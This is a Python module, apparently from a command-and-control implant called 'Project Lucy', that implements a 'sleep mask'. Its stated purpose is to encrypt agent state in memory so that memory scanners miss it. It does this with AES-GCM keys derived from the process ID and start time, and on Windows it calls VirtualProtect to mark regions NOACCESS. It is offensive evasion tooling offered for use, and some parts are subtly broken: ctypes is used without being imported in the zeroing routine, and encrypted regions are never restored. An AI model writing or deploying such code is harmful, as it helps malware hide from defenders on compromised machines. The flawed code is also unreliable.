"""
Sleep mask / memory encryption module for Project Lucy agent.
Encrypts agent state in memory between callbacks to evade memory scanners.
Uses AES-256-GCM with a key derived from process-specific values.
Actions: enable, disable, status, encrypt_region, test.
"""
import os
import platform
import struct
import time

name = "sleep_mask"
version = "1.0.0"
os_compat = ["Windows", "Linux", "Darwin"]
dependencies: list[str] = ["cryptography"]

SYSTEM = platform.system()

# Global state
_mask_active = False
_encrypted_blob = b""
_encryption_key = b""
_encryption_nonce = b""
_encrypted_regions: list[dict] = []

# Win32 constants
PAGE_NOACCESS = 0x01
PAGE_EXECUTE_READWRITE = 0x40


def _derive_key() -> bytes:
    """
    Derive a 32-byte AES key from process-specific values:
    PID + process start time.
    """
    pid = os.getpid()

    if SYSTEM == "Windows":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32

            class FILETIME(ctypes.Structure):
                _fields_ = [
                    ("dwLowDateTime", ctypes.c_uint32),
                    ("dwHighDateTime", ctypes.c_uint32),
                ]

            handle = kernel32.GetCurrentProcess()
            creation_time = FILETIME()
            exit_time = FILETIME()
            kernel_time = FILETIME()
            user_time = FILETIME()
            kernel32.GetProcessTimes(
                handle,
                ctypes.byref(creation_time),
                ctypes.byref(exit_time),
                ctypes.byref(kernel_time),
                ctypes.byref(user_time),
            )
            start_time = (creation_time.dwHighDateTime << 32) | creation_time.dwLowDateTime
        except Exception:
            start_time = int(time.time() * 10000000)
    else:
        try:
            start_time = int(os.stat(f"/proc/{pid}/stat").st_ctime * 10000000)
        except Exception:
            start_time = int(time.time() * 10000000)

    # Build a seed from PID + start_time and hash it to 32 bytes
    seed = f"{pid}:{start_time}".encode("ascii")
    try:
        import hashlib
        key = hashlib.sha256(seed).digest()
    except Exception:
        # Fallback: pad/truncate seed
        key = (seed * 4)[:32]

    return key


def _serialize_state() -> bytes:
    """
    Serialize the current agent state into a plaintext blob.
    In a real deployment this would capture config, keys, module cache, etc.
    Here we capture environment markers and a timestamp.
    """
    state = {
        "pid": os.getpid(),
        "timestamp": time.time(),
        "platform": SYSTEM,
        "hostname": platform.node(),
        "python": platform.python_version(),
    }

    # Simple serialization: key=value pairs separated by newlines
    lines = []
    for k, v in state.items():
        lines.append(f"{k}={v}")
    return "\n".join(lines).encode("utf-8")


def _aesgcm_encrypt(plaintext: bytes, key: bytes):
    """Encrypt plaintext with AES-256-GCM. Returns (nonce, ciphertext)."""
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return nonce, ciphertext


def _aesgcm_decrypt(ciphertext: bytes, key: bytes, nonce: bytes) -> bytes:
    """Decrypt ciphertext with AES-256-GCM."""
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ciphertext, None)


def _zero_memory(data: bytes) -> None:
    """Best-effort zeroing of a bytes buffer's underlying memory."""
    try:
        buf = (ctypes.c_ubyte * len(data)).from_address(
            (ctypes.c_char_p).from_address(id(data) + 16).value
        )
        for i in range(len(data)):
            buf[i] = 0
    except Exception:
        pass


def _enable() -> dict:
    """Enable sleep mask: encrypt agent state and zero plaintext."""
    global _mask_active, _encrypted_blob, _encryption_key, _encryption_nonce

    if _mask_active:
        return {
            "status": "completed",
            "data": {"active": True, "message": "Sleep mask already active"},
        }

    try:
        plaintext = _serialize_state()
        key = _derive_key()
        nonce, ciphertext = _aesgcm_encrypt(plaintext, key)

        _encrypted_blob = ciphertext
        _encryption_key = key
        _encryption_nonce = nonce
        _mask_active = True

        # Best-effort zero the plaintext
        _zero_memory(plaintext)

        return {
            "status": "completed",
            "data": {
                "active": True,
                "encrypted_size": len(ciphertext),
                "nonce": nonce.hex(),
                "key_derivation": "SHA256(PID:start_time)",
            },
        }
    except ImportError:
        return {"status": "failed", "error": "cryptography package not installed"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}


def _disable() -> dict:
    """Disable sleep mask: decrypt and restore agent state."""
    global _mask_active, _encrypted_blob, _encryption_key, _encryption_nonce

    if not _mask_active:
        return {
            "status": "completed",
            "data": {"active": False, "message": "Sleep mask not active"},
        }

    try:
        plaintext = _aesgcm_decrypt(_encrypted_blob, _encryption_key, _encryption_nonce)

        # Parse state back
        state = {}
        for line in plaintext.decode("utf-8").splitlines():
            if "=" in line:
                k, _, v = line.partition("=")
                state[k] = v

        _mask_active = False
        _encrypted_blob = b""
        _encryption_key = b""
        _encryption_nonce = b""

        return {
            "status": "completed",
            "data": {
                "active": False,
                "restored": True,
                "state": state,
                "plaintext_size": len(plaintext),
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"Decryption failed: {exc}"}


def _status() -> dict:
    """Check if sleep mask is currently active."""
    return {
        "status": "completed",
        "data": {
            "active": _mask_active,
            "encrypted_blob_size": len(_encrypted_blob) if _mask_active else 0,
            "encrypted_regions": len(_encrypted_regions),
        },
    }


def _encrypt_region(address: int, size: int) -> dict:
    """
    Encrypt a specific memory region by changing its protection to NOACCESS
    during sleep, then restoring on wake.
    """
    global _encrypted_regions

    if address is None or size is None:
        return {"status": "failed", "error": "Missing 'address' or 'size' parameter"}

    try:
        address = int(address)
        size = int(size)
    except (ValueError, TypeError):
        return {"status": "failed", "error": "address and size must be integers"}

    if size <= 0:
        return {"status": "failed", "error": "size must be positive"}

    try:
        if SYSTEM == "Windows":
            import ctypes
            kernel32 = ctypes.windll.kernel32
            old_protect = ctypes.c_ulong(0)

            # Read the current content
            buf = (ctypes.c_ubyte * size)()
            ctypes.memmove(buf, address, size)
            original_data = bytes(buf)

            # Encrypt the data in memory
            key = _derive_key()
            nonce, ciphertext = _aesgcm_encrypt(original_data, key)

            # Set to NOACCESS during sleep
            result = kernel32.VirtualProtect(
                ctypes.c_void_p(address),
                ctypes.c_size_t(size),
                PAGE_NOACCESS,
                ctypes.byref(old_protect),
            )
            if not result:
                raise ctypes.WinError(ctypes.get_last_error())

            _encrypted_regions.append({
                "address": address,
                "size": size,
                "original_protect": old_protect.value,
                "nonce": nonce,
                "ciphertext": ciphertext,
                "key": key,
            })

            return {
                "status": "completed",
                "data": {
                    "address": hex(address),
                    "size": size,
                    "protected": True,
                    "original_protect": old_protect.value,
                    "encrypted_size": len(ciphertext),
                },
            }
        else:
            # On non-Windows, just encrypt the data without memory protection
            import ctypes
            buf = (ctypes.c_ubyte * size)()
            ctypes.memmove(buf, address, size)
            original_data = bytes(buf)

            key = _derive_key()
            nonce, ciphertext = _aesgcm_encrypt(original_data, key)

            _encrypted_regions.append({
                "address": address,
                "size": size,
                "nonce": nonce,
                "ciphertext": ciphertext,
                "key": key,
            })

            return {
                "status": "completed",
                "data": {
                    "address": hex(address),
                    "size": size,
                    "protected": True,
                    "note": "memory protection not available on this OS",
                },
            }
    except ImportError:
        return {"status": "failed", "error": "cryptography package not installed"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}


def _test() -> dict:
    """Test the encryption/decryption cycle and verify data integrity."""
    try:
        test_data = b"Lucy_sleep_mask_test_" + str(time.time()).encode("ascii")
        test_data = test_data.ljust(64, b"\x00")

        key = _derive_key()
        nonce, ciphertext = _aesgcm_encrypt(test_data, key)
        decrypted = _aesgcm_decrypt(ciphertext, key, nonce)

        integrity_ok = decrypted == test_data

        return {
            "status": "completed",
            "data": {
                "test_passed": integrity_ok,
                "original_size": len(test_data),
                "encrypted_size": len(ciphertext),
                "decrypted_size": len(decrypted),
                "key_size": len(key),
                "nonce_size": len(nonce),
                "algorithm": "AES-256-GCM",
            },
        }
    except ImportError:
        return {"status": "failed", "error": "cryptography package not installed"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}


def run(action: str = "status", **params) -> dict:
    try:
        if action == "enable":
            return _enable()
        elif action == "disable":
            return _disable()
        elif action == "status":
            return _status()
        elif action == "encrypt_region":
            address = params.get("address")
            size = params.get("size")
            return _encrypt_region(address, size)
        elif action == "test":
            return _test()
        return {"status": "failed", "error": f"Unknown action: {action}"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
